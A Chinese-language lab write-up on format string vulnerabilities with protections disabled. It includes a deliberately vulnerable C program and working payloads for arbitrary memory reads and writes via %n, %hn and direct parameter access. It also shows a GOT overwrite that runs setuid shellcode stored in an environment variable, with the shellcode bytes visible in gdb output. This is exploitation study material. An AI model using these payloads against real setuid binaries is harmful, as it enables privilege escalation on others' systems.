# 0x00 beginning

记录学习格式化字符串安全问题, 依然不启用安全机制 (NX, ALSR, CANARY), 主要实验部分参考 [^book1], 更多理论 [^stanford].

示例内存布局` printf("A is %d and is at %08x. B is %x.\n", A, &A, B) `:

    top of stack                                                     bottom of stack
        |--address of format string--|--value of A--|--address of A--|--value of B--|


存在格式化字符串问题的示例代码如下:

```c
/*
 * gcc -fno-stack-protector -m32 -z execstack -o 
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char text[1024];
   static int test_val = -72;
 
   if(argc < 2) {
      printf("Usage: %s <text to print>\n", argv[0]);
      exit(0);
   }
   strcpy(text, argv[1]);

   printf("The right way to print user-controlled input:\n");
   printf("%s", text);

   printf("\nThe wrong way to print user-controlled input:\n");
   printf(text);

   printf("\n");

   // Debug output
   printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);

   exit(0);
}

```

看见里面几个 % 格式化参数, 我们主要关注的格式化参数如下 (其余的不是特别关注):

    %h 把 int 转换为 signed char 或 unsiged char, 如果后面接 n 转换一个指针到 char.
    %s 从内存中读取字符串
    %x 输出十六进制数
    %n 写入这个地方的偏移量

# 0x10 starting

初步探索, 发现在 testing 后面接上一格式化字符串发现输出很奇怪的东西, 其实这个就是内存读取了, 结合着内存空间分别你可以知道读哪里.

```shell
Sn0rt@warzone:~/lab$ ./fmt testing
The right way to print user-controlled input:
testing
The wrong way to print user-controlled input:
testing
[*] test_val @ 0x0804a030 = -72 0xffffffb8
Sn0rt@warzone:~/lab$ ./fmt testing%x
The right way to print user-controlled input:
testing%x
The wrong way to print user-controlled input:
testingbffff270
[*] test_val @ 0x0804a030 = -72 0xffffffb8
Sn0rt@warzone:~/lab$ ./fmt $(python -c 'print "0%x8." * 10')
The right way to print user-controlled input:
0%x8.0%x8.0%x8.0%x8.0%x8.0%x8.0%x8.0%x8.0%x8.0%x8.
The wrong way to print user-controlled input:
0bffff2508.04c8.048.0387825308.07825302e8.025302e388.0302e38788.02e3878258.0387825308.07825302e8.
[*] test_val @ 0x0804a030 = -72 0xffffffb8
```

## 0x11 arbitrary memory Read

这个示例, 需要辅助程序来帮助读环境变量的内存地址, 辅助程序源码如下:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
```

利用`%s`可以从内存读取字符串, 以读取 PATH 为例子, 首先获取 PATH 的内存地址.

```shell
Sn0rt@warzone:~/lab$ ./getaddr PATH fmt
PATH will be at 0xbffffe26
```

然后构造格式化字符串 (注意 intel 小端序), 到 %s 落到`\x26\xfe\xff\xbf`上直到遇见 NULL 之前的数据按照字符串打印出来.

```shell
Sn0rt@warzone:~/lab$ ./fmt $(printf "\x26\xfe\xff\xbf")%08x.%08x.%08x.%s
The right way to print user-controlled input:
&���%08x.%08x.%08x.%s
The wrong way to print user-controlled input:
&���bffff270.0000004c.00000004./local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
[*] test_val @ 0x0804a030 = -72 0xffffffb8

```

读 $PATH 成功!

## 0x12 arbitrary memory write-%x

可以利用`%n`写其对应数据的位置到内存, 不过这个写方法还是蛮麻烦的, 参考<<灰帽黑客: 正义...>>[^book2]11.1.3 写入任意内存提供了一个魔幻公式.
我们以写入 0xddccbbaa 到 test_val 为例

```shell
Sn0rt@warzone:~/lab$ ./fmt $(printf "\x30\xa0\x04\x08")%x%x%156x%n
The right way to print user-controlled input:
0�%x%x%156x%n
The wrong way to print user-controlled input:
0�bffff2704c                                                                                                                                                          4
[*] test_val @ 0x0804a030 = 170 0x000000aa

Sn0rt@warzone:~/lab$ ./fmt $(python -c 'print ("\x30\xa0\x04\x08TEST\x31\xa0\x04\x08TEST\x32\xa0\x04\x08TEST\x33\xa0\x04\x08" + "%x%x%132x%n%17x%n%17x%n%17x%n")')
The right way to print user-controlled input:
0�TEST1�TEST2�TEST3�%x%x%132x%n%17x%n%17x%n%17x%n
The wrong way to print user-controlled input:
0�TEST1�TEST2�TEST3�bffff2404c                                                                                                                                   4         54534554         54534554         54534554
[*] test_val @ 0x0804a030 = -573785174 0xddccbbaa
    
```

## 0x13 arbitrary memory write-direct parameter access

`%Number$n`直接参数访问构造出来的 payload 相对与上面用一堆 %n 构造出来简洁一些, 依然写入`0xddccbbaa`.

```shell
Sn0rt@warzone:~/lab$ ./fmt $(python -c 'print ("\x30\xa0\x04\x08" + "\x31\xa0\x04\x08" + "\x32\xa0\x04\x08" + "\x33\xa0\x04\x08" + "%154x%4$n")')
The right way to print user-controlled input:
0�1�2�3�%154x%4$n
The wrong way to print user-controlled input:
0�1�2�3�                                                                                                                                                  bffff260
[*] test_val @ 0x0804a030 = 170 0x000000AA

Sn0rt@warzone:~/lab$ ./fmt $(python -c 'print ("\x30\xa0\x04\x08" + "\x31\xa0\x04\x08" + "\x32\xa0\x04\x08" + "\x33\xa0\x04\x08" + "%154x%4$n" + "%17x%5$n" + "%17x%6$n" + "%17x%7$n")')
The right way to print user-controlled input:
0�1�2�3�%154x%4$n%17x%5$n%17x%6$n%17x%7$n
The wrong way to print user-controlled input:
0�1�2�3�                                                                                                                                                  bffff250               4c                4          804a030
[*] test_val @ 0x0804a030 = -573785174 0xddccbbaa
```

## 0x14 arbitrary memory write-%h

利用`%h`可以把 payload 构造更加简洁, 而且一次写入两个字节, 这个具体计算方法就是那个魔法公式.
引用 printf 手册:

> h      A  following  integer conversion corresponds to a short int or unsigned short int argument, or a following n conversion corresponds
to a pointer to a short int argument.

如法炮制, 写入`0xddccbbaa`到 test_val.

```shell
Sn0rt@warzone:~/lab$ ./fmt $(python -c 'print ("\x30\xa0\x04\x08" + "\x32\xa0\x04\x08" + "%43699x%4$hn" + "%13073x%5$h")')
....
[*] test_val @ 0x0804a030 = -857888069 0xddccaabb
```
    
# 0x20 using

既然我们能写内存, 那么就能写入到一些关键的地方, 来控制程序的流向.

## 0x21 .dtors

思路 1,.dtors 类似于 C++ 里面构造函数, 函数声明成这个样子`static void func(void) __attribute__ ((destructor))`就类似与 C++ 里面析构函数, 我们打算把 shellcode 放到环境变量里面, 然后利用格式化字符串覆写_DTOR_END_, 按照设计程序会在退出时候调用`exit()`且在 exit() 返回前, 会去调用_DTOR_END_地址的函数, 用 shellcode 在内存里面的地址覆盖掉_DTOR_END_就能 exit() 返回前执行 shellcode.
不过这个新版本的 gcc 生成链接代码的时候生成的 ELF 里面已经没有_DTOR_LIST_与_DTOR_LIST_字段了, 不过现在有了新的目标

```shell
objdump -h -j .fini_array fmt
```

## 0x22 overwrite GOT

思路 2: 类似覆盖.dtors, 利用格式化字符串漏洞把 `exit@plt` 覆写为 shellcode 的环境变量里面的地址, 程序在原来调用 exit() 地方就会转跳到 shellcode 上执行.

做法, 首先需要把 shellcode 放置到环境变量里面, 后获取其地址,shellcode[下载](../media/attach/shellcode.bin). 这个 shellcode 是 setuid(0) 然后 execve(), 所有要对有 suid 位的程序使用, 如果非 suid 则 setuid(0) 调用失败.

```shell
Sn0rt@warzone:~/lab$ sudo chown root:root fmt
Sn0rt@warzone:~/lab$ sudo chmod u+s fmt
Sn0rt@warzone:~/lab$ export SHELLCODE=$(cat shellcode.bin)
Sn0rt@warzone:~/lab$ ./getaddr SHELLCODE ./fmt
SHELLCODE will be at 0xbffff84a
```
    
打算把 exit() 地址覆写为 shellcode 地址, 这个地方利用魔法公式计算一下

```shell
Sn0rt@warzone:~/lab$ objdump -R fmt

fmt:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
...
0804a01c R_386_JUMP_SLOT   exit
0804a020 R_386_JUMP_SLOT   __libc_start_main
0804a024 R_386_JUMP_SLOT   putchar

Sn0rt@warzone:~/lab$ python
...
>>> 0xbfff - 8
49143
>>> 0xf84a - 0xbfff
14411
    
Sn0rt@warzone:~/lab$ ./fmt $(python -c 'print ("\x1e\xa0\x04\x08" + "\x1c\xa0\x04\x08" + "%49143x%4$hn" + "%14411x%5$hn")')
...
[*] test_val @ 0x0804a030 = -72 0xffffffb8
sh-4.3# exit
```

# 0x03 limit

虽然这样覆盖`exit()`成功了, 但是如果开启了 NX 这样的方法就不行了, 一个原因就是 $SHELLCODE 放在环境变量里面, 环境变量 stack 上 (具体还是有点区分的),NX 是不允许里面 [stack] 有 x 的.

```shell
Sn0rt@warzone:~/lab$ gdb fmt 
Reading symbols from fmt...(no debugging symbols found)...done.
gdb-peda$ b main
Breakpoint 1 at 0x80484e0
...
gdb-peda$ r
...
gdb-peda$ searchmem "SHELLCODE" 
Searching for 'SHELLCODE' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0xbffff88d ("SHELLCODE=1\300\061\333\061ə\260\244̀j\vXQh//shh/bin\211\343Q\211\342S\211\341̀")
...
gdb-peda$ vmmap 
Start      End        Perm	Name
0x08048000 0x08049000 r-xp	/home/Sn0rt/lab/fmt
...
0xbffdf000 0xc0000000 rwxp	[stack]
```

### reference

[^book1]: <<Hacking: the art of exploitation>>
[^book2]: <<灰帽黑客: 正义黑客的道德规范, 渗透测试, 攻击方法和漏洞分析技术>>
[^stanford]: [Exploiting Format String Vulnerabilities](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)
